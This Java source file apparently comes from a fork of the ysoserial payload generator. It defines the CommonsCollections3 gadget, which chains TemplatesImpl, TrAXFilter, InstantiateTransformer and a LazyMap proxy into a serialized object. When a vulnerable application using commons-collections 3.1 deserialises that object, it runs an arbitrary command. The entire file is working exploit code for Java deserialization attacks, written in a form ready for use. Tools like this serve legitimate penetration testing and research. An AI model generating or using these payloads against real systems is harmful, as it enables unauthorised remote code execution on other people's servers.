package A.R.ysogate.payloads.gadgets;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import javax.xml.transform.Templates;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.Gadgets;
import A.R.ysogate.payloads.util.JavaVersion;
import A.R.ysogate.payloads.util.Reflections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

/*
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.FROHOFF})
public class CommonsCollections3 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		Object templatesImpl = Gadgets.createTemplatesImpl(command);

		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
				new Transformer[]{new ConstantTransformer(1)});
		// real chain for after setup
		final Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(TrAXFilter.class),
				new InstantiateTransformer(
						new Class[]{Templates.class},
						new Object[]{templatesImpl})};

		final Map               innerMap = new HashMap();
		final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
		final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
		final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return handler;
	}

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isAnnInvHUniversalMethodImpl();
	}
}
